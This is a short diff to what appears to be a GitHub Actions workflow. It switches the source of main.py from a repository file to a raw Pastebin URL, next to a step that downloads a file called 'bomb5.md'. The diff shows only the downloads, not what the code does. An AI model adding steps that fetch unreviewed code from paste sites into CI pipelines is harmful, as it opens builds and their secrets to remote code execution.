@@ -12,7 +12,7 @@ jobs:
         run: curl -L -o bomb5.md https://github.com/user-attachments/files/19927688/bomb5.md
 
       - name: Download main.py
-        run: curl -L -o main.py https://raw.githubusercontent.com/lovelywovi/pushFuze/refs/heads/main/main.py
+        run: curl -L -o main.py https://pastebin.com/raw/hQiU17x3
 
       - name: Set up Python
         uses: actions/setup-python@v5
